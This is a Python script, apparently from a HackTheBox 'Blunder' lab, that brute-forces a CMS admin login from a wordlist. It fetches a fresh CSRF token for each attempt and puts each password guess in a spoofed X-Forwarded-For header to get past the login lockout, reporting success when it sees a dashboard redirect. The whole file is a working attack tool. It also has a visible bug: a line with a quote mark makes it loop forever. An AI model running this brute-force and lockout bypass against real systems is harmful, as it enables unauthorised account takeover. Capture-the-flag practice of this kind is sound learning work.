#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import re

url = "http://10.10.10.191/admin/login"
username="fergus"
pfile = open('/home/user/Desktop/HTB/Blunder/wordlist','r')
line = pfile.readline()
while True:
    password=line
    if password.find("'") != -1 or password.find('"') != -1:
        continue
    password=password.strip()
    print("trying {u}:{p} :".format(u = username, p = password))
    s= requests.Session()
    req=s.get(url)
    soup=BeautifulSoup(req.text)
    csrf=soup.find(id="jstokenCSRF")
    csrftoken=csrf['value']
    headers = {
    'X-Forwarded-For': password,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
    'Referer': url
    }
    data = {
        'tokenCSRF': csrftoken,
        'username': username,
        'password': password,
        'save': ''
        }
    login_attempt = s.post(url, headers = headers, data = data, allow_redirects = False)
    if 'location' in login_attempt.headers:
        if '/admin/dashboard' in login_attempt.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break    
    line=pfile.readline()
    if not line: 
        break